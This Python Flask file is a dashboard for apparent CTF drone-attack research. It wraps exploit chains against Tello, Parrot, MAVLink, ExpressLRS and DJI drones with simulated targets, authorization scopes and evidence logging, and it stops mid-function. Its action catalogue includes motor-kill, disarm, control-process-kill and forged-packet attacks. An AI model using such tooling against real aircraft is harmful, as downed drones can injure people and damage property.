#!/usr/bin/env python3
"""
Drone Scanner Web UI

Flask application that wraps the existing recon engine and exploit chain
modules into a unified browser-based dashboard.

Usage:
    python3 -m pip install -r web/requirements.txt
    python3 web/app.py                        # default on port 5000
    python3 web/app.py --port 8080            # custom port
    python3 web/app.py --simulate             # demo mode, no hardware

For authorized CTF research only.
"""

from __future__ import annotations

import argparse
import json
import socket
import subprocess
import sys
import threading
import time
import uuid
from collections.abc import Generator
from copy import deepcopy
from dataclasses import dataclass, field
from datetime import datetime, timedelta, timezone
from pathlib import Path
from typing import Any

from flask import (
    Blueprint,
    Flask,
    Response,
    current_app,
    has_app_context,
    jsonify,
    render_template,
    request,
)

TOOLS_DIR = Path(__file__).resolve().parent.parent / "tools"
sys.path.insert(0, str(TOOLS_DIR))
sys.path.insert(0, str(TOOLS_DIR / "exploit_chains"))

from exploit_chains.common import AbortHandler, ChainLogger

from capability_pack import (
    AuthorizationError,
    AuthorizationScope,
    BoundedWorker,
    EvidenceStore,
    ExecutionRecord,
    ExecutorInput,
    ExecutorOutput,
    FakeExecutor,
    PackIdentity,
    PackRegistry,
    ResultState,
    ScopeManager,
    SimulationPack,
    TargetDescriptor,
    jsonable,
)

# Pack 1 (real ELRS v3 OTA injection capability) is registered in the
# application registry so operators can look it up and arm it.  It is
# exercised through offline fixtures and the headless pipeline; its live SDR
# transport remains separately gated (tickets 06-07).  Guard the import so the
# dashboard still loads if the ELRS core is unavailable in a given checkout.
try:
    from elrs_v3_pack import ELRSv3OTAInjectionPack
    _ELRS_V3_PACK_AVAILABLE = True
except ImportError:
    ELRSv3OTAInjectionPack = None  # type: ignore[assignment,misc]
    _ELRS_V3_PACK_AVAILABLE = False

MAX_EVENTS = 500
MAX_LOG = 200
MAX_CHAIN2_INJECTIONS = 200
MAX_ARM_SECONDS = 3600  # upper bound on an authorization scope's time limit
CHAIN2_MAX_SEND_PACKETS = 5       # hard ceiling on a live Chain 2 injection burst
CHAIN2_MIN_SEND_INTERVAL_S = 0.05  # floor on the inter-packet interval (rate bound)
EXECUTION_TIMEOUT_S = 30.0        # wall-clock bound on a single bounded-worker run
DEFAULT_PROTOCOLS = ("wifi", "ble", "sdr", "mavlink", "telemetry")
VALID_PROTOCOLS = frozenset(DEFAULT_PROTOCOLS)
STATE_EXTENSION_KEY = "dashboard_state"
STATIC_CACHE_SECONDS = 31_536_000
CONTENT_SECURITY_POLICY = (
    "default-src 'none'; "
    "base-uri 'none'; "
    "connect-src 'self'; "
    "font-src 'self'; "
    "form-action 'self'; "
    "frame-ancestors 'none'; "
    "img-src 'self'; "
    "object-src 'none'; "
    "script-src 'self'; "
    "script-src-attr 'none'; "
    "style-src 'self'; "
    "style-src-attr 'none'"
)


def _new_scanner_status() -> dict[str, str]:
    return {name: "idle" for name in DEFAULT_PROTOCOLS}


def _new_scan_defaults() -> dict[str, str]:
    return {
        "wifi_iface": "wlan0",
        "ble_iface": "hci0",
        "sdr_args": "driver=uhd",
    }


def _new_chain2_state() -> dict[str, Any]:
    return {
        "status": "idle",
        "proxy_running": False,
        "proxy_stats": {},
        "evil_twin": None,
        "last_injection": None,
        "injections": [],
    }


@dataclass
class DashboardState:
    """Mutable runtime state owned by exactly one Flask application.

    ``state_lock`` guards every mutable field and every object reachable from
    those fields. Writers hold it for the complete mutation; readers copy the
    required snapshot while holding it, then serialize or perform blocking work
    after releasing it. Histories are changed only through the bounded helpers
    below. ``scan_lock`` and ``events_lock`` are compatibility aliases for the
    same re-entrant lock. Static protocol/action definitions remain constants.
    """

    state_lock: Any = field(default_factory=threading.RLock, repr=False)
    targets: dict[str, dict[str, Any]] = field(default_factory=dict)
    action_log: list[dict[str, Any]] = field(default_factory=list)
    scanner_status: dict[str, str] = field(default_factory=_new_scanner_status)
    is_scanning: bool = False
    scan_generation: int = 0
    active_scan_generation: int | None = None
    active_scan_thread: Any = field(default=None, repr=False, compare=False)
    simulate_mode: bool = False
    dry_run_mode: bool = True
    hw_status: dict[str, Any] = field(default_factory=dict)
    events: list[dict[str, Any]] = field(default_factory=list)
    next_event_id: int = 0
    scan_defaults: dict[str, str] = field(default_factory=_new_scan_defaults)
    chain2_state: dict[str, Any] = field(default_factory=_new_chain2_state)
    pack_registry: PackRegistry | None = field(default=None, repr=False)
    scope_manager: ScopeManager | None = field(default=None, repr=False)
    evidence_store: EvidenceStore = field(default_factory=EvidenceStore, repr=False)
    # Runtime cancellation tokens for in-flight bounded-worker executions,
    # keyed by execution id. Guarded by state_lock like every mutable field.
    executions: dict[str, Any] = field(default_factory=dict, repr=False)
    _app_owner_token: object | None = field(
        default=None, init=False, repr=False, compare=False,
    )

    @property
    def scan_lock(self) -> Any:
        """Compatibility alias for the unified state lock."""
        return self.state_lock

    @property
    def events_lock(self) -> Any:
        """Compatibility alias for the unified state lock."""
        return self.state_lock

    def reset_runtime(self) -> None:
        """Reset a quiescent instance without changing persistent settings.

        ``next_event_id`` intentionally remains monotonic for the lifetime of
        the application. An already-open SSE stream retains its last cursor,
        so rewinding this counter could suppress otherwise-new events after a
        reset.
        """
        with self.state_lock:
            if self.is_scanning or self.active_scan_thread is not None:
                raise RuntimeError(
                    "Cannot reset dashboard state while a scan worker is active",
                )
            self.scan_generation += 1
            self.active_scan_generation = None
            self.targets.clear()
            self.action_log.clear()
            self.scanner_status = _new_scanner_status()
            self.is_scanning = False
            self.hw_status = {}
            self.chain2_state = _new_chain2_state()
            self.events.clear()
            # Cancel/clear any in-flight execution tokens on reset.
            for cancel_event in self.executions.values():
                cancel_event.set()
            self.executions.clear()
            # Authorization scopes are bound to specific discovered targets;
            # once the targets are cleared the scopes are stale, so drop them.
            if self.scope_manager is not None:
                self.scope_manager.clear()

    def _claim_app(self, owner_token: object) -> None:
        """Bind this state to one application for its complete lifetime."""
        with self.state_lock:
            if self._app_owner_token is not None:
                raise RuntimeError(
                    "Dashboard state is already installed on an application",
                )
            self._app_owner_token = owner_token

    def _release_app(self, owner_token: object) -> None:
        """Roll back an incomplete application-factory installation."""
        with self.state_lock:
            if self._app_owner_token is owner_token:
                self._app_owner_token = None


dashboard = Blueprint("dashboard", __name__)


def _apply_security_headers(response: Response) -> Response:
    """Apply the dashboard's same-origin browser security boundary."""
    response.headers["Content-Security-Policy"] = CONTENT_SECURITY_POLICY
    response.headers["Cross-Origin-Opener-Policy"] = "same-origin"
    response.headers["Cross-Origin-Resource-Policy"] = "same-origin"
    response.headers["Referrer-Policy"] = "no-referrer"
    response.headers["X-Content-Type-Options"] = "nosniff"
    response.headers["X-Frame-Options"] = "DENY"
    return response


def create_dashboard_state(
        *, simulate: bool = False, dry_run: bool = True,
        scan_defaults: dict[str, str] | None = None) -> DashboardState:
    """Create isolated state for one dashboard application instance."""
    registry = build_simulation_registry()
    scope_mgr = ScopeManager(registry)
    evidence = EvidenceStore()
    state = DashboardState(
        simulate_mode=simulate, dry_run_mode=dry_run,
        pack_registry=registry,
        scope_manager=scope_mgr,
        evidence_store=evidence,
    )
    if scan_defaults:
        with state.state_lock:
            state.scan_defaults.update(scan_defaults)
    return state


def get_dashboard_state(flask_app: Flask | None = None) -> DashboardState:
    """Return state for an explicit app, the request app, or the default app."""
    if flask_app is None:
        flask_app = current_app._get_current_object() if has_app_context() else app
    state = flask_app.extensions.get(STATE_EXTENSION_KEY)
    if not isinstance(state, DashboardState):
        raise RuntimeError("Dashboard state is not installed on this application")
    return state


def _push_event(
        state: DashboardState, event_type: str, data: dict[str, Any]) -> None:
    with state.state_lock:
        event_id = state.next_event_id
        state.next_event_id += 1
        state.events.append({
            "id": event_id,
            "type": event_type,
            "data": deepcopy(data),
            "timestamp": datetime.now(timezone.utc).isoformat(),
        })
        _trim_history(state.events, MAX_EVENTS)


def _trim_history(history: list[Any], limit: int) -> None:
    """Keep only the newest ``limit`` entries; caller holds ``state_lock``."""
    overflow = len(history) - limit
    if overflow > 0:
        del history[:overflow]


def _record_action(state: DashboardState, entry: dict[str, Any]) -> None:
    """Atomically append a detached action and its corresponding event."""
    with state.state_lock:
        state.action_log.append(deepcopy(entry))
        _trim_history(state.action_log, MAX_LOG)
        _push_event(state, "action_executed", entry)


def _record_chain2_history(
        state: DashboardState, results: list[dict[str, Any]],
        actions: list[dict[str, Any]]) -> None:
    """Atomically update both bounded Chain 2 integration histories."""
    with state.state_lock:
        state.action_log.extend(deepcopy(actions))
        _trim_history(state.action_log, MAX_LOG)
        state.chain2_state["injections"].extend(deepcopy(results))
        _trim_history(
            state.chain2_state["injections"], MAX_CHAIN2_INJECTIONS,
        )
        retained = state.chain2_state["injections"]
        state.chain2_state["last_injection"] = (
            deepcopy(retained[-1]) if retained else None
        )


# Map a Chain 2 injection outcome to a truthful, monotonic Result State path.
# A dry-run builds the packet only (PREVIEWED). A successful host-side UDP send
# confirms bytes left the radio (TRANSMITTED) but says nothing about receiver
# acceptance, so it never advances past TRANSMITTED.
_CHAIN2_STATE_PATHS: dict[str, list[ResultState]] = {
    "dry_run": [ResultState.PREVIEWED],
    "pending": [ResultState.PREVIEWED],
    "error": [ResultState.PREVIEWED, ResultState.ATTEMPTED],
    "sent": [ResultState.PREVIEWED, ResultState.ATTEMPTED, ResultState.TRANSMITTED],
}


def _record_chain2_evidence(
        state: DashboardState, entry: dict[str, Any],
        pack_name: str, pack_version: str) -> None:
    """Append an append-only ExecutionRecord for a Chain 2 injection.

    Chain 2 now shares the same evidence contract as every other capability:
    each injection attempt (including a dry-run preview) produces a truthful
    Result State path and a durable-shaped evidence record.
    """
    store = state.evidence_store
    if store is None:
        return
    now = datetime.now(timezone.utc)
    states = _CHAIN2_STATE_PATHS.get(entry.get("status", ""), [ResultState.PREVIEWED])
    transition_log = [(s, now) for s in states]
    record = ExecutionRecord(
        capability_version=pack_version,
        target_identity=entry.get("target_id") or "",
        prerequisite_values={"command": entry.get("command")},
        prerequisite_modes={},
        authorization_scope_ref=f"{pack_name}/{pack_version}/{entry.get('target_id') or ''}",
        start_time=datetime.fromisoformat(entry["timestamp"]),
        end_time=now,
        transition_log=transition_log,
        verification_evidence={
            "status": entry.get("status"),
            "packet_hex": entry.get("packet_hex"),
            "packet_size": entry.get("packet_size"),
            "transmitted": entry.get("status") == "sent",
            "error": entry.get("error"),
        },
        stop_reason=entry.get("status") or "completed",
        hardware_identity="chain2-udp",
    )
    store.append(record)


def _set_scanner_status(
        state: DashboardState, scanner_name: str, scanner_status: str,
        scan_generation: int | None = None) -> bool:
    """Set one scanner status only for the currently owned scan lifecycle."""
    with state.state_lock:
        if not _scan_is_current_locked(state, scan_generation):
            return False
        state.scanner_status[scanner_name] = scanner_status
        return True


def _scan_is_current_locked(
        state: DashboardState, scan_generation: int | None) -> bool:
    """Return whether a caller owns the current lifecycle; caller holds lock."""
    if scan_generation is None:
        return False
    return state.active_scan_generation == scan_generation


def _claim_direct_scan(state: DashboardState) -> int:
    """Register a synchronous compatibility scan as an owned lifecycle."""
    with state.state_lock:
        if (
                state.is_scanning
                or state.active_scan_generation is not None
                or state.active_scan_thread is not None):
            raise RuntimeError("Scan already in progress")
        state.scan_generation += 1
        scan_generation = state.scan_generation
        state.active_scan_generation = scan_generation
        state.active_scan_thread = threading.current_thread()
        state.is_scanning = True
        return scan_generation


def _push_scan_event(
        state: DashboardState, scan_generation: int | None,
        event_type: str, data: dict[str, Any]) -> bool:
    """Append a scan event only while its lifecycle still owns the state."""
    with state.state_lock:
        if not _scan_is_current_locked(state, scan_generation):
            return False
        _push_event(state, event_type, data)
        return True


def _finish_scan(
        state: DashboardState, scan_generation: int | None = None) -> bool:
    """Release only the scan slot owned by ``scan_generation``."""
    with state.state_lock:
        if not _scan_is_current_locked(state, scan_generation):
            return False
        for name, scanner_state in state.scanner_status.items():
            if scanner_state == "scanning":
                state.scanner_status[name] = "error"
        state.is_scanning = False
        state.active_scan_generation = None
        state.active_scan_thread = None
        return True


def _run_scan_worker(
        state: DashboardState, scan_generation: int,
        worker: Any, worker_args: tuple[Any, ...]) -> None:
    """Own worker cleanup even if dispatch fails before worker bootstrap."""
    try:
        worker(state, *worker_args, scan_generation=scan_generation)
    except Exception as exc:
        _push_scan_event(
            state,
            scan_generation,
            "scan_failed",
            {"error": str(exc) or type(exc).__name__},
        )
    finally:
        _finish_scan(state, scan_generation)


# --- Hardware detection ---

def simulated_hardware_status() -> dict[str, Any]:
    """Return deterministic status without touching host hardware or sockets."""
    note = "Simulation mode: hardware probe disabled"
    return {
        "mode": "simulation",
        "probe_performed": False,
        "wifi": {
            "available": False,
            "status": "not_checked",
            "interfaces": [],
            "default": None,
            "note": note,
        },
        "ble": {
            "available": False,
            "status": "not_checked",
            "interfaces": [],
            "default": None,
            "note": note,
        },
        "sdr": {
            "available": False,
            "status": "not_checked",
            "devices": [],
            "default_args": "",
            "note": note,
        },
        "mavlink": {
            "available": False,
            "status": "not_checked",
            "bindable_ports": [],
            "note": "Simulation mode: UDP listener readiness not checked",
        },
    }


def detect_hardware() -> dict[str, Any]:
    """Probe for available scanner hardware and return an uncached snapshot."""
    checks: dict[str, Any] = {
        "mode": "live",
        "probe_performed": True,
    }

    # WiFi interface
    try:
        result = subprocess.run(
            ["nmcli", "-t", "-f", "DEVICE,TYPE,STATE", "device"],
            capture_output=True, text=True, timeout=5,
        )
        wifi_devs = [
            line.split(":")[0]
            for line in result.stdout.splitlines()
            if (":wifi:" in line and "connected" in line.lower()) or ":wifi:" in line
        ]
        if not wifi_devs:
            result2 = subprocess.run(
                ["ip", "link", "show"], capture_output=True, text=True, timeout=5,
            )
            for line in result2.stdout.splitlines():
                if "wlan" in line or "wlp" in line:
                    parts = line.split(":")
                    if len(parts) >= 2:
                        wifi_devs.append(parts[1].strip())
        checks["wifi"] = {
            "available": bool(wifi_devs),
            "interfaces": wifi_devs,
            "default": wifi_devs[0] if wifi_devs else None,
        }
    except (FileNotFoundError, subprocess.TimeoutExpired):
        checks["wifi"] = {"available": False, "interfaces": [], "error": "nmcli/ip not found"}

    # BLE
    try:
        result = subprocess.run(
            ["hciconfig"], capture_output=True, text=True, timeout=5,
        )
        ble_devs = []
        for line in result.stdout.splitlines():
            if line and not line.startswith("\t") and ":" in line:
                ble_devs.append(line.split(":")[0])
        checks["ble"] = {
            "available": bool(ble_devs),
            "interfaces": ble_devs,
            "default": ble_devs[0] if ble_devs else None,
        }
    except (FileNotFoundError, subprocess.TimeoutExpired):
        try:
            import importlib.util
            bleak_spec = importlib.util.find_spec("bleak")
            checks["ble"] = {
                "available": bleak_spec is not None,
                "interfaces": ["bleak"],
                "default": "bleak" if bleak_spec else None,
                "note": "Using bleak library",
            }
        except Exception:
            checks["ble"] = {"available": False, "interfaces": [], "error": "No BLE stack found"}

    # SDR (SoapySDR)
    try:
        import SoapySDR
        devs = SoapySDR.Device.enumerate()
        dev_labels = [d.get("label", d.get("driver", "unknown")) for d in devs]
        checks["sdr"] = {
            "available": bool(devs),
            "devices": dev_labels,
            "default_args": "driver=uhd" if any("uhd" in str(d) for d in devs) else "",
        }
    except ImportError:
        checks["sdr"] = {"available": False, "devices": [], "error": "SoapySDR not installed"}
    except Exception as e:
        checks["sdr"] = {"available": False, "devices": [], "error": str(e)}

    # MAVLink UDP (check common ports for traffic)
    mavlink_ports = []
    for port in [14550, 14555, 5760]:
        sock = None
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            sock.settimeout(0.5)
            sock.bind(("0.0.0.0", port))
            mavlink_ports.append(port)
        except OSError:
            pass
        finally:
            if sock is not None:
                sock.close()
    listener_ready = bool(mavlink_ports)
    checks["mavlink"] = {
        "available": listener_ready,
        "status": "listener_ready" if listener_ready else "unavailable",
        "bindable_ports": mavlink_ports,
        "note": "UDP listener readiness only; no peer or hardware was detected",
    }

    return checks


# --- Simulated scanner data ---

SIMULATED_TARGETS = [
    {
        "id": "wifi:60:60:1F:AA:BB:CC",
        "protocol": "wifi",
        "name": "TELLO-AABBCC",
        "type": "Ryze Tello",
        "drone_type": "tello",
        "signal": -45,
        "encryption": "Open",
        "threat_level": "HIGH",
        "vulns": ["OPEN_WIFI", "KNOWN_DEFAULT_CREDS", "UDP_SDK_EXPOSED"],
        "details": {
            "bssid": "60:60:1F:AA:BB:CC",
            "channel": 6,
            "ip": "192.168.10.1",
            "sdk_port": 8889,
            "video_port": 11111,
        },
        "available_actions": ["land", "emergency", "takeoff", "streamon", "rc_zero"],
        "chain": "wifi_tello",
    },
    {
        "id": "wifi:A0:14:3D:11:22:33",
        "protocol": "wifi",
        "name": "ardrone2_044833",
        "type": "Parrot AR.Drone 2",
        "drone_type": "parrot_ar",
        "signal": -62,
        "encryption": "Open",
        "threat_level": "HIGH",
        "vulns": ["OPEN_WIFI", "ROOT_TELNET", "NO_AUTH"],
        "details": {
            "bssid": "A0:14:3D:11:22:33",
            "channel": 11,
            "ip": "192.168.1.1",
            "telnet_port": 23,
            "at_command_port": 5556,
        },
        "available_actions": ["land", "emergency_watchdog", "kill_control"],
        "chain": "wifi_parrot",
    },
    {
        "id": "mav:1:1",
        "protocol": "mavlink",
        "name": "MAVLink Quadrotor (sys=1)",
        "type": "QUADROTOR",
        "drone_type": "mavlink",
        "signal": None,
        "encryption": "None",
        "threat_level": "CRITICAL",
        "vulns": ["NO_MSG_SIGNING", "IN_FLIGHT", "ARMED"],
        "details": {
            "sysid": 1,
            "compid": 1,
            "autopilot": "ArduPilot",
            "mav_version": 2,
            "armed": True,
            "state": "ACTIVE",
            "mode": "STABILIZE",
            "source": "192.168.1.100:14550",
            "signed": False,
            "lat": 37.7749,
            "lon": -122.4194,
            "alt_m": 52.3,
        },
        "available_actions": ["disarm", "land", "rtl", "reboot"],
        "chain": "mavlink",
    },
    {
        "id": "elrs:A1:B2:C3",
        "protocol": "elrs",
        "name": "ELRS TX (UID A1:B2:C3)",
        "type": "ExpressLRS Transmitter",
        "drone_type": "elrs",
        "signal": -71,
        "encryption": "Binding Phrase",
        "threat_level": "MEDIUM",
        "vulns": ["BINDING_PHRASE_KNOWN", "FHSS_PREDICTABLE"],
        "details": {
            "uid_fragment": "A1:B2:C3",
            "freq_band": "2.4 GHz ISM",
            "rate": "250Hz",
            "fhss_channels": 80,
            "rainbow_match": True,
            "binding_phrase": "iloveflying",
            "ota_version": 3,
        },
        "available_actions": ["forge_disarm", "preview_fhss", "scan_deeper"],
        "chain": "elrs",
    },
    {
        "id": "ble:48:1C:B9:DE:AD:01",
        "protocol": "ble",
        "name": "DJI-Mavic3-BLE",
        "type": "DJI Mavic 3 (BLE)",
        "drone_type": "dji_ble",
        "signal": -78,
        "encryption": "BLE Pairing",
        "threat_level": "LOW",
        "vulns": ["BLE_EXPOSED"],
        "details": {
            "address": "48:1C:B9:DE:AD:01",
            "manufacturer": "DJI Technology",
            "services": ["FPV Stream", "Remote ID"],
        },
        "available_actions": ["ble_scan_services"],
        "chain": "dji_ble",
    },
]

# Action definitions per chain
ACTION_DEFS = {
    "land": {
        "label": "Force Land",
        "description": "Send immediate landing command",
        "severity": "warning",
        "category": "active",
        "icon": "arrow-down",
    },
    "emergency": {
        "label": "Emergency Stop",
        "description": "Kill all motors immediately (drone falls)",
        "severity": "danger",
        "category": "active",
        "icon": "x-octagon",
    },
    "takeoff": {
        "label": "Takeoff",
        "description": "Command drone to take off",
        "severity": "warning",
        "category": "active",
        "icon": "arrow-up",
    },
    "streamon": {
        "label": "Capture Video",
        "description": "Enable video stream from drone camera",
        "severity": "info",
        "category": "passive",
        "icon": "video",
    },
    "rc_zero": {
        "label": "Zero RC",
        "description": "Set all RC inputs to zero (hover/stop)",
        "severity": "warning",
        "category": "active",
        "icon": "pause",
    },
    "disarm": {
        "label": "Disarm Motors",
        "description": "Disarm the flight controller motors",
        "severity": "danger",
        "category": "active",
        "icon": "shield-off",
    },
    "rtl": {
        "label": "Return to Launch",
        "description": "Command drone to return to its launch position",
        "severity": "warning",
        "category": "active",
        "icon": "home",
    },
    "reboot": {
        "label": "Reboot FC",
        "description": "Reboot the flight controller",
        "severity": "danger",
        "category": "active",
        "icon": "refresh-cw",
    },
    "emergency_watchdog": {
        "label": "Watchdog Reset",
        "description": "Send AT*COMWDG watchdog reset (Parrot)",
        "severity": "danger",
        "category": "active",
        "icon": "alert-triangle",
    },
    "kill_control": {
        "label": "Kill Control Process",
        "description": "Kill the drone's main control process via Telnet",
        "severity": "danger",
        "category": "active",
        "icon": "x-circle",
    },
    "forge_disarm": {
        "label": "Forge Disarm Packet",
        "description": "Build forged RC disarm packet using recovered binding params",
        "severity": "danger",
        "category": "simulated",
        "icon": "zap",
    },
    "preview_fhss": {
        "label": "Preview FHSS Sequence",
        "description": "Show the computed FHSS hop sequence",
        "severity": "info",
        "category": "simulated",
        "icon": "radio",
    },
    "scan_deeper": {
        "label": "Deep ELRS Scan",
        "description": "Extended scan for SYNC packet capture",
        "severity": "info",
        "category": "passive",
        "icon": "search",
    },
    "ble_scan_services": {
        "label": "Scan BLE Services",
        "description": "Enumerate BLE GATT services and characteristics",
        "severity": "info",
        "category": "passive",
        "icon": "bluetooth",
    },
    "replay": {
        "label": "Replay Packets",
        "description": "Replay captured MAVLink packets (works against weak signing)",
        "severity": "danger",
        "category": "active",
        "icon": "repeat",
    },
    "sniff": {
        "label": "Sniff Traffic",
        "description": "Capture and analyze MAVLink traffic",
        "severity": "info",
        "category": "passive",
        "icon": "activity",
    },
}

# ---------------------------------------------------------------------------
# Simulation pack definitions — one per attack chain
# ---------------------------------------------------------------------------

# Maps chain name -> list of action names for that chain
_CHAIN_ACTIONS: dict[str, list[str]] = {
    "wifi_tello": ["land", "emergency", "takeoff", "streamon", "rc_zero"],
    "wifi_parrot": ["land", "emergency_watchdog", "kill_control"],
    "mavlink": ["sniff", "disarm", "land", "rtl", "reboot", "replay"],
    "elrs": ["forge_disarm", "preview_fhss", "scan_deeper"],
    "dji_ble": ["ble_scan_services"],
    "chain2_wifi_mavlink": ["disarm", "land"],
}

_CHAIN_METADATA: dict[str, dict[str, Any]] = {
    "wifi_tello": {
        "description": "WiFi Tello SDK command injection",
        "effects": [{"name": "motor_stop", "destructive": True, "description": "Emergency motor kill"}],
    },
    "wifi_parrot": {
        "description": "WiFi Parrot AT command / telnet injection",
        "effects": [{"name": "process_kill", "destructive": True, "description": "Kill control process"}],
    },
    "mavlink": {
        "description": "MAVLink UDP command injection and traffic sniffing",
        "effects": [{"name": "disarm", "destructive": True, "description": "Disarm flight controller"}],
    },
    "elrs": {
        "description": "ExpressLRS FHSS analysis and packet forging",
        "effects": [{"name": "desync", "destructive": False, "description": "Receiver desynchronization"}],
    },
    "dji_ble": {
        "description": "DJI BLE GATT service enumeration",
        "effects": [],
    },
    "chain2_wifi_mavlink": {
        "description": "Chain 2: WiFi to MAVLink injection pipeline",
        "effects": [{"name": "command_injection", "destructive": True, "description": "MAVLink command injection via WiFi"}],
    },
}


def build_simulation_registry() -> PackRegistry:
    """Build a PackRegistry populated with one SimulationPack per chain.

    Each pack's ``actions`` list carries the ACTION_DEFS metadata so the
    ``/api/actions`` endpoint can serve complete pack metadata from the
    registry instead of the static ``ACTION_DEFS`` dictionary.
    """
    registry = PackRegistry()
    for chain_name, action_names in _CHAIN_ACTIONS.items():
        meta = _CHAIN_METADATA.get(chain_name, {})
        actions = []
        for act_name in action_names:
            act_def = ACTION_DEFS.get(act_name, {})
            actions.append({
                "name": act_name,
                "label": act_def.get("label", act_name),
                "description": act_def.get("description", ""),
                "severity": act_def.get("severity", "info"),
                "category": act_def.get("category", "simulated"),
                "icon": act_def.get("icon", ""),
            })
        pack = SimulationPack(
            name=f"sim-{chain_name}",
            version="0.1.0",
            description=meta.get("description", f"Simulation pack for {chain_name}"),
            chain=chain_name,
            actions=actions,
            effects=meta.get("effects", []),
        )
        registry.register(pack)

    # Register Pack 1 (real ELRS v3 OTA injection) alongside the simulation
    # packs so it is discoverable via registry lookup/query. It is a real
    # CapabilityPack (not a SimulationPack), so it does not appear in the
    # /api/actions simulation catalog and is not auto-resolved for the demo
    # targets; it is exercised through offline fixtures and the headless
    # pipeline, and its live transport stays gated.
    if _ELRS_V3_PACK_AVAILABLE and ELRSv3OTAInjectionPack is not None:
        registry.register(ELRSv3OTAInjectionPack())

    return registry


def build_simulation_executor(*, preview_only: bool = False) -> FakeExecutor:
    """Return a FakeExecutor with a canned sequence for simulation mode.

    When *preview_only* is True, the executor stops at PREVIEWED (no
    hardware probes, no RF, no network activity).  Otherwise it walks
    through the simulation sequence to ATTEMPTED (the highest state a
    simulation should claim without real evidence).
    """
    if preview_only:
        sequence = [ResultState.PREVIEWED]
    else:
        sequence = [ResultState.PREVIEWED, ResultState.ATTEMPTED]
    return FakeExecutor(
        canned_sequence=sequence,
        canned_evidence={"simulated": True, "side_effects": False},
    )


def _resolve_pack_for_target(
    registry: PackRegistry, target: dict[str, Any],
) -> SimulationPack | None:
    """Find the registered SimulationPack matching a target's chain."""
    chain = target.get("chain", "")
    for pack in registry.query({}):
        if isinstance(pack, SimulationPack) and pack.chain == chain:
            return pack
    return None


def _derive_target_descriptor(target: dict[str, Any]) -> TargetDescriptor:
    """Build a TargetDescriptor from a *server-side* discovered target record.

    The applicability fields come from the target's own discovered
    attributes (``protocol``/``details``), never from client-supplied
    applicability claims, so the Applicability Boundary match is a real
    check against the discovered target rather than a tautology.  Any
    attribute the scan did not actually establish is left as the ``"*"``
    wildcard, which (by the strict arm rule) cannot satisfy a pack's specific
    boundary requirement — so an ambiguous target cannot arm a specific pack.
    """
    details = target.get("details", {}) or {}
    protocol = target.get("protocol", "")
    ota = details.get("ota_version")
    if protocol == "elrs" and ota is not None:
        protocol_version = f"ELRS v{ota} OTA"
    else:
        protocol_version = "*"
    return TargetDescriptor(
        identity=target["id"],
        protocol_version=protocol_version,
        firmware_impl=str(details.get("firmware_impl", "*") or "*"),
        firmware_version=str(details.get("firmware_version", "*") or "*"),
        phy_domain=str(details.get("phy_domain", "*") or "*"),
        model=str(target.get("type") or details.get("model") or "*"),
        revision=str(details.get("revision", "*") or "*"),
        interface=str(details.get("interface", "*") or "*"),
    )


def _execute_via_registry(
    state: DashboardState,
    registry: PackRegistry,
    target: dict[str, Any],
    action_name: str,
    preview_only: bool = False,
) -> dict[str, Any]:
    """Resolve pack, run through FakeExecutor, emit SSE events, return response.

    This is the unified dispatch path that replaces the old
    execute_action_simulated / execute_action_live if/elif chain.
    """
    pack = _resolve_pack_for_target(registry, target)
    if pack is None:
        return {
            "error": f"No registered pack for chain '{target.get('chain', '')}'",
            "result_state": None,
            "transition_log": [],
            "stop_reason": "no_pack",
        }

    pack_id = pack.identity

    # Authorization is ALWAYS required to execute (non-preview), regardless of
    # simulate/dry-run mode. Dry-run governs only whether the executor performs
    # real I/O; it does NOT waive the scoped-authorization boundary. Preview is
    # probe-free and side-effect-free (user story 3), so it needs no arming.
    if not preview_only:
        scope_manager = state.scope_manager
        if scope_manager is None:
            return {
                "error": "Authorization subsystem not initialized",
                "result_state": None,
                "transition_log": [],
                "stop_reason": "authorization_denied",
            }
        try:
            scope_manager.authorize(
                pack_name=pack_id.name,
                pack_version=pack_id.version,
                target_identity=target["id"],
                action=action_name,
            )
        except AuthorizationError as exc:
            return {
                "error": str(exc),
                "result_state": None,
                "transition_log": [],
                "stop_reason": "authorization_denied",
            }

    executor = build_simulation_executor(preview_only=preview_only)
    inp = ExecutorInput(
        pack_identity=pack_id,
        target=_derive_target_descriptor(target),
        scope_reference=f"{pack_id.name}/{pack_id.version}/{target['id']}",
        parameters={"action": action_name, "target_details": target.get("details", {})},
    )

    # Run in an isolated bounded worker (off this request thread) with a
    # wall-clock timeout and a runtime cancellation token registered so the
    # operator cancel API can stop an in-flight execution.
    exec_id = uuid.uuid4().hex[:8]
    cancel_event = threading.Event()
    with state.state_lock:
        state.executions[exec_id] = cancel_event
    try:
        worker_result = BoundedWorker(timeout_s=EXECUTION_TIMEOUT_S).run(
            executor, inp, cancel_event=cancel_event,
        )
    finally:
        with state.state_lock:
            state.executions.pop(exec_id, None)

    output = worker_result.output
    if output is None:
        # The run did not complete (timeout / cancelled / error): no truthful
        # Result State was produced, so none is claimed.
        return {
            "id": exec_id,
            "timestamp": datetime.now(timezone.utc).isoformat(),
            "target_id": target["id"],
            "target_name": target.get("name", "Unknown"),
            "action": action_name,
            "result_state": None,
            "transition_log": [],
            "stop_reason": worker_result.stop_reason,
            "error": str(worker_result.error) if worker_result.error else None,
            "pack_name": pack_id.name,
            "pack_version": pack_id.version,
        }

    # Emit SSE events for each Result State transition
    for rs, ts in output.transition_log:
        _push_event(state, "result_state_transition", {
            "target_id": target["id"],
            "action": action_name,
            "state": rs.value,
            "timestamp": ts.isoformat(),
            "pack_name": pack_id.name,
        })

    # Build action log entry
    entry = {
        "id": exec_id,
        "timestamp": datetime.now(timezone.utc).isoformat(),
        "target_id": target["id"],
        "target_name": target.get("name", "Unknown"),
        "action": action_name,
        "label": _action_label(pack, action_name),
        "result_state": output.final_state.value,
        "stop_reason": output.stop_reason,
        "pack_name": pack_id.name,
        "pack_version": pack_id.version,
    }
    _record_action(state, entry)

    # Build serializable transition log for the HTTP response
    transition_log = [
        {"state": rs.value, "timestamp": ts.isoformat()}
        for rs, ts in output.transition_log
    ]

    # Append evidence record to evidence store
    end_time = datetime.now(timezone.utc)
    evidence_record = ExecutionRecord(
        capability_version=pack_id.version,
        target_identity=target["id"],
        prerequisite_values={"action": action_name},
        prerequisite_modes={},
        authorization_scope_ref=inp.scope_reference,
        start_time=datetime.fromisoformat(entry["timestamp"]),
        end_time=end_time,
        transition_log=output.transition_log,
        verification_evidence=output.evidence,
        stop_reason=output.stop_reason,
        hardware_identity="simulation",
    )
    if state.evidence_store is not None:
